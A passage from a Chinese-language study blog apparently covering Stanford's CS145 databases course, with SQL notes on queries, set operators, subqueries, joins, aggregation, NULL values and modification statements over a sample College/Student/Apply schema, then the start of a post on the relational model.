mode=display">E_1 \cap E_2 = E_1 - (E_1 - E_2)</script></blockquote><h1 id="二、-SQL"><a href="#二、-SQL" class="headerlink" title="二、 SQL"></a>二、 SQL</h1><h2 id="1-基本查询"><a href="#1-基本查询" class="headerlink" title="1. 基本查询"></a>1. 基本查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  A_1, A_2, ..., A_n </span><br><span class="line"><span class="keyword">FROM</span>  R_1, R_2, ..., R_n </span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span> </span><br></pre></td></tr></table></figure><p>上述语句相当于关系代数中的：</p><script type="math/tex; mode=display">\Pi_{A_1, A_2, ..., A_n} ( \sigma_{condition} (R_1 \times R_2 \times ... \times R_n))</script><p>由关系代数表达式，不难得到语句执行的顺序为，<strong>先FROM，再WHERE，最后再SELECT</strong></p><p>注意：SQL基于multiset，允许重复元组的存在，而关系代数基于set，不允许重复元组</p><p>示例：</p><p>本节所有示例均基于三个表，结构如下<br>College(<u>cName</u>, state, enrollment) 主键为cName<br>student(<u>sID</u>, sName, GPA, sizeHS) 主键为sID<br>Apply(<u>sID</u>, <u>cName</u>, <u>major</u>, decision) 主键为sID, cName, major</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> student.sID, sName, GPA, Apply.cName, enrollment</span><br><span class="line"><span class="keyword">from</span> student, college, Apply</span><br><span class="line"><span class="keyword">where</span> Apply.sID <span class="operator">=</span> student.sID <span class="keyword">and</span> Apply.cName <span class="operator">=</span> College.cName <span class="comment">--and连接多个条件</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> GPA <span class="keyword">desc</span>; <span class="comment">--order by attName 按属性升序, order by arrName desc 按属性降序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sID, major</span><br><span class="line"><span class="keyword">from</span> Apply</span><br><span class="line"><span class="keyword">where</span> major <span class="keyword">like</span> <span class="string">&#x27;%bio%&#x27;</span>; <span class="comment">--like接模式串可模糊查询</span></span><br></pre></td></tr></table></figure><h2 id="2-表变量和集合运算符"><a href="#2-表变量和集合运算符" class="headerlink" title="2. 表变量和集合运算符"></a>2. 表变量和集合运算符</h2><h3 id="2-1-表变量-Table-Variables"><a href="#2-1-表变量-Table-Variables" class="headerlink" title="2.1 表变量(Table Variables)"></a>2.1 表变量(Table Variables)</h3><p>可以在FROM后的表达式，为<strong>每个关系赋别名</strong>将其区分开，由于FROM是较先执行的，别名可以在WHERE和SELECT中出现，示例如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询GPA相等的两个学生的信息</span></span><br><span class="line"><span class="keyword">select</span> s1.sID, s1.sName, s1.GPA, s2.sID, s2.sName, s2.GPA</span><br><span class="line"><span class="keyword">from</span> student sl,student s2</span><br><span class="line"><span class="keyword">where</span> s1.GPA <span class="operator">=</span> s2.GPA <span class="keyword">and</span> s1.sID <span class="operator">&lt;&gt;</span> s2.sID;</span><br></pre></td></tr></table></figure><p>后续可将复杂的查询结果命名为一个临时表，用于简化语句，详见”3.子查询 3.2from中的子查询”</p><h3 id="2-2-集合运算符-Set-Operators"><a href="#2-2-集合运算符-Set-Operators" class="headerlink" title="2.2 集合运算符(Set Operators)"></a>2.2 集合运算符(Set Operators)</h3><p>并运算：union去除重复行并作排序，union all保留重复行且不作排序<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--在select后接 as newName重命名列名</span></span><br><span class="line"><span class="comment">--对结构相同的两个关系做并运算</span></span><br><span class="line"><span class="keyword">select</span> cName <span class="keyword">as</span> name <span class="keyword">from</span> Co1lege </span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> sName <span class="keyword">as</span> name <span class="keyword">from</span> Student;</span><br></pre></td></tr></table></figure></p><p>交运算：intersect<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询申请了CS且申请了EE的学生的ID</span></span><br><span class="line"><span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span><span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">intersect</span></span><br><span class="line"><span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;EE&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--相当于</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> A1.sID <span class="comment">--加distinct是由于叉积运算时，其他属性如cName不同会使结果的sID存在重复</span></span><br><span class="line"><span class="keyword">from</span> Apply A1, Apply A2 </span><br><span class="line"><span class="keyword">where</span> A1.sID <span class="operator">=</span> A2.sID <span class="keyword">and</span> A1.major <span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> <span class="keyword">and</span> A2.major <span class="operator">=</span><span class="string">&#x27;EE&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--in 在后续&quot;子查询&quot;中介绍</span></span><br><span class="line"><span class="comment">--也相当于</span></span><br><span class="line"><span class="keyword">select</span> sID</span><br><span class="line"><span class="keyword">from</span> Apply</span><br><span class="line"><span class="keyword">where</span> sID <span class="keyword">in</span> (<span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span> )</span><br><span class="line"><span class="keyword">and</span> sID <span class="keyword">in</span> (<span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;EE&#x27;</span>)</span><br></pre></td></tr></table></figure></p><p>差运算：except<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询申请了CS但没有申请EE的学生的ID</span></span><br><span class="line"><span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span><span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">except</span></span><br><span class="line"><span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;EE&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--相当于</span></span><br><span class="line"><span class="keyword">select</span> sID</span><br><span class="line"><span class="keyword">from</span> Apply</span><br><span class="line"><span class="keyword">where</span> sID <span class="keyword">in</span> (<span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span> )</span><br><span class="line"><span class="keyword">and</span> sID <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;EE&#x27;</span>)</span><br></pre></td></tr></table></figure></p><h2 id="3-子查询-Subqueries"><a href="#3-子查询-Subqueries" class="headerlink" title="3. 子查询(Subqueries)"></a>3. 子查询(Subqueries)</h2><h3 id="3-1-where中的子查询"><a href="#3-1-where中的子查询" class="headerlink" title="3.1 where中的子查询"></a>3.1 where中的子查询</h3><p>(1) in / not in</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sID</span><br><span class="line"><span class="keyword">from</span> Apply</span><br><span class="line"><span class="keyword">where</span> sID <span class="keyword">in</span> (<span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span> )</span><br><span class="line"><span class="keyword">and</span> sID <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> sID <span class="keyword">from</span> Apply <span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;EE&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(2) exists / not exists ：往往在from为表起别名，在where的exists后接表达式使其满足一定条件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询所在州有其他学校的学校的名字和所在州名</span></span><br><span class="line"><span class="keyword">select</span> cName, state</span><br><span class="line"><span class="keyword">from</span> College c1</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> College C2 <span class="keyword">where</span> c2.state <span class="operator">=</span> c1.state);</span><br><span class="line"></span><br><span class="line"><span class="comment">--查询GPA最高的学生的名字</span></span><br><span class="line"><span class="keyword">select</span> sName</span><br><span class="line"><span class="keyword">from</span> student C1</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Student C2 <span class="keyword">where</span> C2.GPA <span class="operator">&gt;</span> C1.GPA); </span><br><span class="line"><span class="comment">--不存在比C1的GPA要高的C2，即C1的GPA最高</span></span><br></pre></td></tr></table></figure><p>(3) op any / op all (op为运算符：&lt;, &gt;, =, …)：<br>   any相当于数学意义的存在符号$\exists$<br>   all相当于数学意义的任意符号$\forall$<br>   那么有，not exp1 op any(exp2) 等价于 exp1 op all(exp2)<br>   exp1 op any(exp2) 等价于 not exp1 op all(exp2)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询GPA最高的学生的名字及其GOA</span></span><br><span class="line"><span class="keyword">select</span> sName, GPA <span class="keyword">from</span> Student</span><br><span class="line"><span class="keyword">where</span> GPA <span class="operator">&gt;=</span> <span class="keyword">all</span>(<span class="keyword">select</span> GPA <span class="keyword">from</span> Student) <span class="comment">--这个学生的GPA大于任意其他学生的GPA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--查询注册人数最少的学校的名字</span></span><br><span class="line"><span class="keyword">select</span> cName</span><br><span class="line"><span class="keyword">from</span> College c1</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> enrollment <span class="operator">&lt;=</span> <span class="keyword">any</span>(<span class="keyword">select</span> enrollment <span class="keyword">from</span> College c2 </span><br><span class="line">        <span class="keyword">where</span> c2.cName <span class="operator">&lt;&gt;</span> c1.cName); <span class="comment">--不存在另一个学校注册人数大于等于这个学校的注册人数</span></span><br></pre></td></tr></table></figure></p><h3 id="3-2-from中的子查询"><a href="#3-2-from中的子查询" class="headerlink" title="3.2 from中的子查询"></a>3.2 from中的子查询</h3><p>在进行以下查询时，一些复杂的项，如GPA*(sizeHS/1000.0)，需要重复书写<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询GPA和scaledGPA相差超过1.0的学生的信息</span></span><br><span class="line"><span class="keyword">select</span> sID, sName, GPA, GPA<span class="operator">*</span>(sizeHS<span class="operator">/</span><span class="number">1000.0</span>) <span class="keyword">as</span> scaledGPA</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> GPA<span class="operator">*</span>(sizeHs<span class="operator">/</span><span class="number">1000.0</span>) <span class="operator">-</span> GPA <span class="operator">&gt;</span> <span class="number">1.0</span> <span class="keyword">or</span> GPA<span class="operator">-</span>GPA<span class="operator">*</span>(sizeHS<span class="operator">/</span><span class="number">1000.0</span>) <span class="operator">&gt;</span> <span class="number">1.0</span>;</span><br></pre></td></tr></table></figure></p><p>由于查询的结果也是一张表，我们可以将其命名，并嵌套用于新一轮的查询，改进如下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询GPA和scaledGPA相差超过1.0的学生的信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> sID, sName, GPA, GPA<span class="operator">*</span>(sizeHS<span class="operator">/</span><span class="number">1000.0</span>) <span class="keyword">as</span> scaledGPA</span><br><span class="line"><span class="keyword">from</span> student) G</span><br><span class="line"><span class="keyword">where</span> <span class="built_in">abs</span>(G.GPA <span class="operator">-</span> G.scaledGPA) <span class="operator">&gt;</span> <span class="number">1.0</span>;</span><br></pre></td></tr></table></figure></p><h3 id="3-3-select中的子查询"><a href="#3-3-select中的子查询" class="headerlink" title="3.3 select中的子查询"></a>3.3 select中的子查询</h3><p>当一个表达式恰好能返回一个结果时，可以将表达式置于select中，如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询每个学校申请的人当中的最高GPA</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> college.cName, state, GPA</span><br><span class="line"><span class="keyword">from</span> College, Apply, Student</span><br><span class="line"><span class="keyword">where</span> College.cName <span class="operator">=</span> Apply.cName <span class="keyword">and</span> Apply.sID <span class="operator">=</span> Student.sID</span><br><span class="line">    <span class="keyword">and</span> GPA <span class="operator">&gt;=</span> <span class="keyword">all</span>(<span class="keyword">select</span> GPA <span class="keyword">from</span> Student, Apply </span><br><span class="line">                    <span class="keyword">where</span> Student.sID <span class="operator">=</span> Apply.sID </span><br><span class="line">                        <span class="keyword">and</span> Apply.cName <span class="operator">=</span> College.cName);</span><br></pre></td></tr></table></figure><br>等价于<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询每个学校申请的人当中的最高GPA</span></span><br><span class="line"><span class="keyword">select</span> cName, state,</span><br><span class="line">(<span class="keyword">select</span> <span class="keyword">distinct</span> GPA</span><br><span class="line"><span class="keyword">from</span> Apply, Student</span><br><span class="line"><span class="keyword">where</span> College.cName <span class="operator">=</span> Apply.cName <span class="keyword">and</span> Apply.sID <span class="operator">=</span> Student.sID</span><br><span class="line">    <span class="keyword">and</span> GPA <span class="operator">&gt;=</span> <span class="keyword">all</span>(<span class="keyword">select</span> GPA <span class="keyword">from</span> Student, Apply </span><br><span class="line">                    <span class="keyword">where</span> Student.sID <span class="operator">=</span> Apply.sID </span><br><span class="line">                        <span class="keyword">and</span> Apply.cName <span class="operator">=</span> College.cName)) <span class="keyword">as</span> GPA</span><br><span class="line"><span class="keyword">from</span> College;</span><br></pre></td></tr></table></figure></p><h2 id="4-连接运算符-Join-Operators"><a href="#4-连接运算符-Join-Operators" class="headerlink" title="4. 连接运算符(Join Operators)"></a>4. 连接运算符(Join Operators)</h2><p>JOIN需要接 ON E 或者 USING($A_1$, $A_2$, …, $A_n$ )，E为表达式，$A_1$, $A_2$, …, $A_n$为列名。通常ON和USING不能同时出现。</p><p>注意：所有的JOIN运算都不符合结合律</p><p><strong>INNER JOIN</strong></p><p>INNER可以省略</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> E_1 <span class="keyword">JOIN</span>  E_2   </span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">condition</span></span><br></pre></td></tr></table></figure><p>相当于$\theta$连接，即$ \Pi_{Shema_1 \cup Shema_2}(\sigma_{condition}(E_1 \times E_2) ) $</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> E_1 <span class="keyword">NATURAL</span> <span class="keyword">JOIN</span>  E_2   </span><br></pre></td></tr></table></figure><p>相当于自然连接，即$\Pi_{Shema_1 \cup Shema_2} (\sigma_{E_1.A_1 = E_2.A_1, E_1.A_2 = E_2.A_2,…, E_1.A_n = E_2.A_n} ( E_1 \times E_2))$，会隐式合并相同列（不建议），于是可以用USING人为指定：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> E_1 <span class="keyword">JOIN</span>  E_2  <span class="keyword">USING</span>(A_1, A_2)</span><br></pre></td></tr></table></figure><p><strong>LEFT/RIGHT/FULL OUTER JOIN</strong></p><p>OUTER 可以省略<br>LEFT JOIN 保留左边，即使右边没有相匹配<br>RIGHT JOIN 保留右边。即使左边没有相匹配<br>FULL JOIN 左右都保留</p><h2 id="5-聚合查询-Aggregation"><a href="#5-聚合查询-Aggregation" class="headerlink" title="5. 聚合查询(Aggregation)"></a>5. 聚合查询(Aggregation)</h2><h3 id="5-1-聚合函数"><a href="#5-1-聚合函数" class="headerlink" title="5.1 聚合函数"></a>5.1 聚合函数</h3><ol><li>max：求最大值</li><li>min：求最小值</li><li>avg：求平均值</li><li>sum：求和</li><li>count：求计数</li></ol><h3 id="5-2-分组查询"><a href="#5-2-分组查询" class="headerlink" title="5.2 分组查询"></a>5.2 分组查询</h3><p>GROUP BY 将FROM得到的关系做分组，通常，使用了GROUP BY后，SELECT中只能出现<strong>聚合函数</strong>以及<strong>分组所用的属性</strong></p><p>HAVING 后接表达式对分组后的新关系再做限制，通常HAVING后的表达式是对聚合函数值得限制</p><p>示例：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询每个学校申请每个专业的人的最低GPA和最高GPA</span></span><br><span class="line"><span class="keyword">select</span> cName, major, <span class="built_in">min</span>(GPA), <span class="built_in">max</span>(GPA)</span><br><span class="line"><span class="keyword">from</span> Student, Apply</span><br><span class="line"><span class="keyword">where</span> Student.sID <span class="operator">=</span> Apply.sID</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> cName, major;</span><br></pre></td></tr></table></figure><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询每个学生申请的学校的数量</span></span><br><span class="line"><span class="keyword">select</span> Student.sID, <span class="built_in">count</span>(<span class="keyword">distinct</span> cName) <span class="comment">--count distinct的组合很好用</span></span><br><span class="line"><span class="keyword">from</span> Student, Apply</span><br><span class="line"><span class="keyword">where</span> Student.sID <span class="operator">=</span> Apply.sID</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> student.sID;</span><br></pre></td></tr></table></figure></p><h2 id="6-NULL值"><a href="#6-NULL值" class="headerlink" title="6. NULL值"></a>6. NULL值</h2><p>在查询中要特别注意NULL值：当一个属性为NULL值时，不会被WHERE中的数学表达式所限定，故有is null 专门判断NULL值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sID, sName ,GPA</span><br><span class="line"><span class="keyword">from</span> Student</span><br><span class="line"><span class="keyword">where</span> GPA <span class="operator">&gt;</span> <span class="number">3.5</span> <span class="keyword">or</span> GPA <span class="operator">&lt;=</span> <span class="number">3.5</span> <span class="keyword">or</span> GPA <span class="keyword">is</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>SELCET中能够查询到值为空的属性：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> GPA</span><br><span class="line"><span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+---+-------+</span><br><span class="line">|   |  GPA  |</span><br><span class="line">+---+-------+</span><br><span class="line">| 1 | NULL  |</span><br><span class="line">| 2 | 2.9   |</span><br><span class="line">| 3 | 3.5   |</span><br><span class="line">| 4 | 3.4   |</span><br><span class="line">| 5 | 3.1   |</span><br><span class="line">| 6 | 3.2   |     </span><br><span class="line">+---+-------+</span><br></pre></td></tr></table></figure></p><h2 id="7-Modification-Statements"><a href="#7-Modification-Statements" class="headerlink" title="7. Modification Statements"></a>7. Modification Statements</h2><p>对表作修改的语句有：</p><h3 id="7-1-插入操作"><a href="#7-1-插入操作" class="headerlink" title="7.1 插入操作"></a>7.1 插入操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tableName </span><br><span class="line"><span class="keyword">VALUE</span> (A_1, A_2, A_3, ...)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tableName () </span><br><span class="line"><span class="keyword">select</span><span class="operator">-</span>statement  <span class="comment">--将查询的结果插入到表中</span></span><br></pre></td></tr></table></figure><p>示例：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--将没有申请学校的学生设置为申请了Carnegie Mellon的CS</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Apply </span><br><span class="line"><span class="keyword">select</span> sID, <span class="string">&#x27;Carnegie Mellon&#x27;</span>, <span class="string">&#x27;CS&#x27;</span>, <span class="keyword">null</span> </span><br><span class="line"><span class="keyword">from</span> Student</span><br><span class="line"><span class="keyword">where</span> sID <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> sID <span class="keyword">from</span> Apply);</span><br></pre></td></tr></table></figure></p><h3 id="7-2-删除操作"><a href="#7-2-删除操作" class="headerlink" title="7.2 删除操作"></a>7.2 删除操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> tableName () </span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>  <span class="comment">--删除满足条件的行</span></span><br></pre></td></tr></table></figure><p>示例：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--删除申请表中申请专业超过两个的人</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> Apply</span><br><span class="line"><span class="keyword">where</span> sID <span class="keyword">in</span> </span><br><span class="line">(<span class="keyword">select</span> sID</span><br><span class="line"><span class="keyword">from</span> Apply</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sID</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> major) <span class="operator">&gt;</span> <span class="number">2</span>);</span><br></pre></td></tr></table></figure></p><h3 id="7-3-更新操作"><a href="#7-3-更新操作" class="headerlink" title="7.3 更新操作"></a>7.3 更新操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> tableName</span><br><span class="line"><span class="keyword">SET</span> A_1 <span class="operator">=</span> E_1, A_2 <span class="operator">=</span> E_2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span> </span><br><span class="line"><span class="comment">--将满足条件的行中的属性修改为指定值，这个指定值也可以是只返回一个值的查询语句</span></span><br></pre></td></tr></table></figure><p>示例：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--将所有申请Carnegie Mellon并且GPA小于3.6的申请修改为经济学economics</span></span><br><span class="line"><span class="keyword">update</span> Apply</span><br><span class="line"><span class="keyword">set</span> major <span class="operator">=</span><span class="string">&#x27;economics&#x27;</span></span><br><span class="line"><span class="keyword">where</span> cName <span class="operator">=</span><span class="string">&#x27;Carnegie Mellon&#x27;</span><span class="keyword">and</span> sID <span class="keyword">in</span> (<span class="keyword">select</span> sID <span class="keyword">from</span> student <span class="keyword">where</span> GPA <span class="operator">&lt;</span> <span class="number">3.6</span>);</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 关系代数 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS145 Intro to databases 学习笔记1——Relational Model、XML、JSON</title>
      <link href="/2024/01/25/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%E2%80%94%E2%80%94Relational%20Model%E3%80%81XML%E3%80%81JSON/"/>
      <url>/2024/01/25/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%E2%80%94%E2%80%94Relational%20Model%E3%80%81XML%E3%80%81JSON/</url>
      
        <content type="html"><![CDATA[<h1 id="零、前言"><a href="#零、前言" class="headerlink" title="零、前言"></a>零、前言</h1><h2 id="1-碎碎念"><a href="#1-碎碎念" class="headerlink" title="1. 碎碎念"></a>1. 碎碎念</h2><p>前几天真是煎熬啊，也可能是没写博客输出内容，学的有些不安QwQ。。学计算机网络在哈工大和湖科大两个视频之间左右横跳，概念的东西有些太多了看的很不爽，耐心濒临崩溃。。又去做一下GAN的实战案例，自己是写不出来的，跑别人的代码也死慢死慢的。最后决定先放一放，来看数据库系统好了</p><h2 id="2-本文概述"><a href="#2-本文概述" class="headerlink" title="2. 本文概述"></a>2. 本文概述</h2><p>本文是学习<strong>standford CS145 Introduction to Databases</strong>系列视频的第一篇笔记，内容主要包括第二章第四章的三种数据模型：</p><ol><li>Relational Model</li><li>XML</li><li>JSON</li></ol><p>视频链接：<a href="https://www.youtube.com/playlist?list=PLroEs25KGvwzmvIxYHRhoGTz9w8LeXek0">Introduction to Databases - Jennifer Widom - Stanford</a></p><h1 id="一、Relational-Model"><a href="#一、Relational-Model" class="headerlink" title="一、Relational Model"></a>一、Relational Model</h1><h2 id="1-Relational-Model的介绍"><a href="#1-Relational-Model的介绍" class="headerlink" title="1. Relational Model的介绍"></a>1. Relational Model的介绍</h2><h3 id="1-1-Relational-Model的定义"><a href="#1-1-Relational-Model的定义" class="headerlink" title="1.1 Relational Model的定义"></a>1.1 Relational Model的定义</h3><p><strong>Schema</strong>是指对数据库结构的描述<br><strong>Instance</strong>是指在数据库运作时出现的真实数据</p><blockquote><p><strong>Schema</strong>——structural description of relations in database<br><strong>Instance</strong>——actual contents at given point in time</p></blockquote><p>在Relational Model中</p><ol><li>数据库是一些已命名的<strong>关系</strong>（或称为<strong>表</strong>）的集合。如，学生表，学校表</li><li>每个表包含已命名的<strong>属性</strong>（或称为<strong>列</strong>）。如学号，姓名</li><li>每个<strong>元组</strong>（或称为<strong>行</strong>）有对应属性的值。</li><li>每个属性应指定<strong>类型</strong> (或称为 <strong>范围</strong>)</li></ol><blockquote><ol><li>Database = set of named <strong>relations</strong> (or <strong>tables</strong></li><li>Each relation has a set of named <strong>attributes</strong> (or <strong>columns</strong></li><li>Each <strong>tuple</strong> (or <strong>row</strong>) has a value for each attribute</li><li>Each attribute has 